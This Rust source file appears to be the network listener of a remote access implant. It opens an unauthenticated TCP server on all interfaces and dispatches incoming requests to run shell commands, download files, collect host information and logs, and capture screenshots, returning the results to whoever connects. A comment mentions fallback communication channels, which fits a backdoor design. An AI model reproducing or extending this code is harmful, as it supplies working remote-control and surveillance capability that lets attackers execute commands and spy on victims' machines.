use log::{debug, error, info};
use std::io::{Error, Read, Write};
use std::net::{Shutdown, TcpListener, TcpStream};
use std::thread;

use crate::communication::messages::{GetScreenshotResponse, Message, MESSAGE_HEADER_LENGTH};
use crate::communication::serialization::{extract_msg_type_and_length, serialize_message};

use crate::actions::basic_info::{download_file_message, get_basic_info_request};
use crate::actions::commands::run_command_message;
use crate::actions::log_actions::get_logs_request;
use crate::actions::screenshot_actions::get_screenshot_request;

pub const BIND_ANY: &str = "0.0.0.0";

fn send_response(response: Message, mut stream: &TcpStream) -> Result<(), Error> {
    let response_buffer = serialize_message(response)?;
    debug!("Sending response buffer: {:?}", &response_buffer);
    stream.write_all(&response_buffer)?;
    Ok(())
}

fn handle_message(message: Message, stream: &TcpStream) {
    match message {
        Message::RunCommandRequest(rcr) => {
            let response = run_command_message(rcr);
            let response = Message::RunCommandResponse { 0: response };
            send_response(response, stream).unwrap();
        }
        Message::DownloadFileRequest(dfr) => {
            let response = download_file_message(dfr);
            let response = Message::DownloadFileResponse { 0: response };
            send_response(response, stream).unwrap();
        }
        Message::GetBasicInfoRequest(_bir) => {
            let response = get_basic_info_request();
            let response = Message::GetBasicInfoResponse { 0: response };
            send_response(response, stream).unwrap();
        }
        Message::GetLogsRequest(_glr) => {
            let response = get_logs_request();
            let response = Message::GetLogsResponse { 0: response };
            send_response(response, stream).unwrap();
        }
        Message::GetScreenshotRequest(_gsr) => {
            let response: GetScreenshotResponse = get_screenshot_request();
            let response = Message::GetScreenshotResponse { 0: response };
            send_response(response, stream).unwrap();
        }
        _ => error!("Unrecognized message type"),
    }
}

pub fn get_message(mut stream: &TcpStream) -> Result<Message, Error> {
    let mut type_and_length = [0_u8; MESSAGE_HEADER_LENGTH];
    match stream.read_exact(&mut type_and_length) {
        Ok(()) => {
            let msg_length = extract_msg_type_and_length(type_and_length);
            let mut message_buffer = vec![0; msg_length];

            // Read_exact function guarantees that we will read exactly enough data to fill the buffer
            stream
                .read_exact(&mut message_buffer)
                .expect("Could not read message after getting message metadata. Error: {}");
            let msg: Message = ron::de::from_bytes(&message_buffer).unwrap();
            Ok(msg)
        }
        Err(e) => {
            error!(
                "An error occurred, terminating connection with {}. Error: {}",
                stream.peer_addr()?,
                e
            );
            stream.shutdown(Shutdown::Both)?;
            Err(e)
        }
    }
}

pub fn handle_client(stream: TcpStream) -> Result<(), Error> {
    debug!("Handling connection from {}", stream.peer_addr()?);
    while match get_message(&stream) {
        Ok(message) => {
            println!("Got message!!!");
            handle_message(message, &stream);
            true
        }
        Err(e) => {
            println!("Error!!");
            error!(
                "An error occurred while trying to get message. Error: {}",
                e
            );
            return Err(e);
        }
    } {}
    Ok(())
}

pub fn run_server(port: u16) -> Result<(), Error> {
    // If we can't open the server, it probably means:
    // - The port is already taken, or we are not running in sufficient permissions
    // - We treat both as recoverable errors, since if the port is not open now it might be open later.
    // - And, in addition, we have other ways to communicate so we should try them too instead of panicking.
    let listener = TcpListener::bind(format!("{}:{}", BIND_ANY, port))?;

    match listener.local_addr() {
        Ok(address) => {
            info!("Listening on: {:?}", address);
        }
        Err(e) => {
            error!("Error {} while trying to get local address.", &e);
        }
    };
    // accept connections and process them in a new thread
    for stream in listener.incoming() {
        match stream {
            Ok(stream) => {
                info!("New connection with: {}", stream.peer_addr()?);
                thread::spawn(move || {
                    // connection succeeded
                    // TODO what to do if this returns Error
                    handle_client(stream)
                });
            }
            Err(e) => {
                error!("Connection failed: {}", e);
                /* connection failed */
            }
        }
    }
    // TODO handle this panic
    panic!("Server closed unexpectedly")
}
